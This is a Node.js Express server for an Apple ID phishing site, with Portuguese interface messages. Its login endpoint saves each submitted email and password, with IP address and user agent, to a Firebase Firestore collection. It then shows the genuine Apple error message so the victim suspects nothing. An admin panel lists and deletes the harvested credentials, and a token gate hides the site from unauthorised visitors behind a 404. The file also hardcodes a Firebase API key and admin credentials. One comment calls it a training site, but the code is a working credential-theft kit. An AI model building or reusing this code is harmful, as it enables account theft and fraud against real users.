const express = require('express');
const bodyParser = require('body-parser');
const cookieParser = require('cookie-parser');
const path = require('path');
const { initializeApp } = require('firebase/app');
const { getFirestore, collection, addDoc, getDocs, deleteDoc, doc, query, orderBy, serverTimestamp } = require('firebase/firestore');

const app = express();
const PORT = process.env.PORT || 3000;

// Firebase Configuration (Migrated from Missoes project for speed)
const firebaseConfig = {
    apiKey: "AIzaSyDsWJ9VVMSIsQNtifkLVnRNnbzU7favF7s",
    authDomain: "missoes-drive.firebaseapp.com",
    projectId: "missoes-drive",
    storageBucket: "missoes-drive.firebasestorage.app",
    messagingSenderId: "198254465545",
    appId: "1:198254465545:web:dce028792e2c2c57161ed8"
};

// Initialize Firebase
const firebaseApp = initializeApp(firebaseConfig);
const db = getFirestore(firebaseApp);
const CREDENTIALS_COLLECTION = 'buscar_credentials';

// Middleware
app.use(bodyParser.json());
app.use(cookieParser());

// --- TOKEN SYSTEM ---
// Define the access token (Can be changed via Environment Variable)
const ACCESS_TOKEN = process.env.ACCESS_TOKEN || 'buscar2026';

app.use((req, res, next) => {
    // 1. Check for token in query string: ?t=TOKEN
    const tokenFromQuery = req.query.t;
    if (tokenFromQuery === ACCESS_TOKEN) {
        res.cookie('access_token', ACCESS_TOKEN, { maxAge: 1000 * 60 * 60 * 24 * 7, httpOnly: true });
        // Redirect to clean URL without token
        return res.redirect(req.path);
    }

    // 2. Check for token in cookie
    const tokenFromCookie = req.cookies.access_token;
    
    // Allow static assets, but protect HTML files and APIs
    const isStaticAsset = /\.(css|js|png|jpg|jpeg|gif|svg|ico)$/.test(req.path);
    const isApi = req.path.startsWith('/api/');

    if (tokenFromCookie === ACCESS_TOKEN || isStaticAsset) {
        return next();
    }

    // If not authorized, show a 404 or a decoy page
    // For this training site, we'll just show a "Not Found" to look like a dead link
    res.status(404).send('Not Found');
});
// --------------------

app.use(express.static(path.join(__dirname, 'public')));

// Admin credentials (Keep same as original)
const ADMIN_EMAIL = 'admin@buscar.com';
const ADMIN_PASSWORD = 'Admin@2026';

// Login endpoint - saves credentials to Firestore
app.post('/api/login', async (req, res) => {
    const { email, password } = req.body;

    if (!email || !password) {
        return res.status(400).json({ success: false, message: 'Email e senha são obrigatórios' });
    }

    // Save credential to Firestore
    try {
        await addDoc(collection(db, CREDENTIALS_COLLECTION), {
            email,
            password,
            timestamp: new Date().toISOString(),
            createdAt: serverTimestamp(),
            userAgent: req.headers['user-agent'],
            ip: req.headers['x-forwarded-for'] || req.connection.remoteAddress
        });
    } catch (err) {
        console.error('Error saving to Firebase:', err);
    }

    // Check if admin
    if (email === ADMIN_EMAIL && password === ADMIN_PASSWORD) {
        return res.json({ success: true, isAdmin: true });
    }

    // Not admin - return error (Same as Apple UI)
    return res.json({ success: false, message: 'ID Apple ou senha incorreta.' });
});

// Admin authentication endpoint
app.post('/api/admin/auth', (req, res) => {
    const { email, password } = req.body;

    if (email === ADMIN_EMAIL && password === ADMIN_PASSWORD) {
        return res.json({ success: true });
    }

    return res.status(401).json({ success: false, message: 'Acesso negado' });
});

// Get all stored credentials (admin only) - from Firestore
app.post('/api/admin/data', async (req, res) => {
    const { email, password } = req.body;

    if (email !== ADMIN_EMAIL || password !== ADMIN_PASSWORD) {
        return res.status(401).json({ success: false, message: 'Acesso negado' });
    }

    try {
        const q = query(collection(db, CREDENTIALS_COLLECTION), orderBy('createdAt', 'desc'));
        const querySnapshot = await getDocs(q);
        const data = [];
        querySnapshot.forEach((doc) => {
            data.push({ id: doc.id, ...doc.data() });
        });
        return res.json({ success: true, data });
    } catch (err) {
        console.error(err);
        return res.status(500).json({ success: false, message: 'Erro ao ler dados' });
    }
});

// Delete single entry
app.post('/api/admin/delete', async (req, res) => {
    const { email, password, docId } = req.body; // Changed from index to docId

    if (email !== ADMIN_EMAIL || password !== ADMIN_PASSWORD) {
        return res.status(401).json({ success: false, message: 'Acesso negado' });
    }

    try {
        await deleteDoc(doc(db, CREDENTIALS_COLLECTION, docId));
        return res.json({ success: true });
    } catch (err) {
        return res.status(500).json({ success: false, message: 'Erro ao deletar' });
    }
});

// Clear all data (Not implemented for Firestore for safety, but can be added)
app.post('/api/admin/clear', (req, res) => {
    res.status(501).json({ success: false, message: 'Operação não suportada nesta versão.' });
});

// Health check
app.get('/api/health', (req, res) => res.send('OK'));

app.listen(PORT, () => {
    console.log(`\n🔍 Buscar Server (Firebase) running at http://localhost:${PORT}`);
    console.log(`📱 Admin panel at http://localhost:${PORT}/admin.html\n`);
});
